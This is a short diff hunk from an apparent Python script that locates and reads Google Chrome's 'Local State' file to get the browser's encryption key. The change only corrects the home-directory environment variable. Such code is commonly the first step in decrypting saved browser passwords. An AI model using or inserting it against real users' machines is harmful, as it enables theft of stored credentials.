@@ -11,7 +11,7 @@ def get_chrome_datetime(chrome_date):
     return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
 
 def get_encryption_key():
-    local_state_path = os.path.join(os.environ["home"],
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                     "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = f.read()
